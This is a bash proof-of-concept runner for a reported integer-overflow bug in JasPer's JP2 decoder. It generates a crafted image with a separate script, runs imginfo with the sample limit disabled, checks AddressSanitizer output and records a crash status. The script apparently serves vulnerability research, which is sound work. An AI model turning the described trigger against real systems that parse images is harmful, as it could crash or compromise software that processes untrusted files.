#!/usr/bin/env bash
# vuln_002_run.sh - Run the PoC for VULN-002 in jpc_dec_process_siz()
#
# Vulnerability: missing return -1 after jas_safe_size_add overflow check
# (jpc_dec.c lines 1282-1284). With --max-samples 0, the subsequent sample
# limit check is also skipped, allowing processing to continue with a
# corrupted (overflowed) num_samples value.
#
# Usage: bash vuln_002_run.sh

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
POC_FILE="$SCRIPT_DIR/vuln_002.jp2"
IMGINFO="/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo"
ASAN_LOG_PREFIX="$SCRIPT_DIR/asan.log"
STATUS_FILE="$SCRIPT_DIR/vuln_002_status.txt"

# ---------------------------------------------------------------------------
# Step 1: Generate the PoC JP2 file
# ---------------------------------------------------------------------------
echo "[*] Generating PoC file..."
python3 "$SCRIPT_DIR/vuln_002_gen.py" "$POC_FILE"
echo ""

# ---------------------------------------------------------------------------
# Step 2: Run imginfo with --max-samples 0
#   --max-samples 0  sets dec->max_samples = 0, disabling the sample limit.
#   This means the only protection is the jas_safe_size_add check, which
#   has the missing-return bug (VULN-002).
# ---------------------------------------------------------------------------
echo "[*] Running imginfo with --max-samples 0 ..."
echo "    Command: $IMGINFO --max-samples 0 -f $POC_FILE"
echo ""

ASAN_OPTIONS="log_path=${ASAN_LOG_PREFIX}:abort_on_error=0" \
    timeout 30 "$IMGINFO" --max-samples 0 -f "$POC_FILE" 2>&1
EXIT_CODE=$?

echo ""
echo "[*] imginfo exit code: $EXIT_CODE"

# ---------------------------------------------------------------------------
# Step 3: Check for ASAN log output
# ---------------------------------------------------------------------------
ASAN_FOUND=0
for f in "${ASAN_LOG_PREFIX}".*; do
    if [ -f "$f" ] && [ -s "$f" ]; then
        echo "[!] ASAN log found: $f"
        head -40 "$f"
        ASAN_FOUND=1
    fi
done

# ---------------------------------------------------------------------------
# Step 4: Determine and record status
# ---------------------------------------------------------------------------
if [ "$ASAN_FOUND" -eq 1 ]; then
    STATUS="VERIFIED_CRASH"
    REASON="ASAN log generated; overflow in cumulative sample count confirmed."
elif [ "$EXIT_CODE" -ne 0 ]; then
    STATUS="UNVERIFIED"
    REASON="imginfo exited with non-zero status ($EXIT_CODE). The overflow likely caused an early error path or OOM, but no ASAN log was produced. The binary may not be ASAN-instrumented."
else
    STATUS="UNVERIFIED"
    REASON="imginfo exited 0. The overflow may not have been reached or the effect was absorbed silently."
fi

echo ""
echo "[*] Status: $STATUS"
echo "[*] Reason: $REASON"

cat > "$STATUS_FILE" <<EOF
$STATUS
exit_code=$EXIT_CODE
asan_log_found=$ASAN_FOUND
poc_file=$POC_FILE
command=$IMGINFO --max-samples 0 -f $POC_FILE
reason=$REASON
EOF

echo "[*] Status written to: $STATUS_FILE"
